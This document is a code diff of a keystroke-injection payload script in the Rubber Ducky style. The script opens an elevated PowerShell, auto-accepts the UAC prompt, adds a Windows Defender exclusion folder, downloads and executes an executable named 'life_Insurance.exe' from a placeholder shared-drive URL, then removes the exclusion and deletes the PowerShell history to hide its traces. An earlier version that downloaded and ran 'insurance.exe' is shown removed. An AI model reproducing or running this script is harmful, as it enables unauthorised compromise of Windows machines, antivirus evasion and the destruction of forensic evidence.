@@ -5,16 +5,20 @@ REM Version: 1.0
 DELAY 2000
 GUI r
 DELAY 500
-STRING powershell
+STRING powershell Start-Process powershell -Verb runAs
 ENTER
 DELAY 3000
-STRING $down = New-Object System.Net.WebClient; $url = '%SHARED_DRIVE%'; $file = 'insurance.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file);
+ALT y
+DELAY 3000
+STRING cd C:\ ; mkdir temp; Add-MpPreference -ExclusionPath "C:\temp"
 ENTER
-DELAY 1000
-STRING rm insurance.exe
+STRING $down = New-Object System.Net.WebClient; $url = '%SHARED_DRIVE%'; $file = 'life_Insurance.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file);
 ENTER
 DELAY 500
-STRING Remove-Item (Get-PSreadlineOption).HistorySavePath
+STRING cd .. ; rm -r temp
+ENTER
+DELAY 500
+STRING Remove-MpPreference -ExclusionPath "C:\temp" ; Remove-Item (Get-PSreadlineOption).HistorySavePath
 ENTER
 DELAY 500
 STRING exit
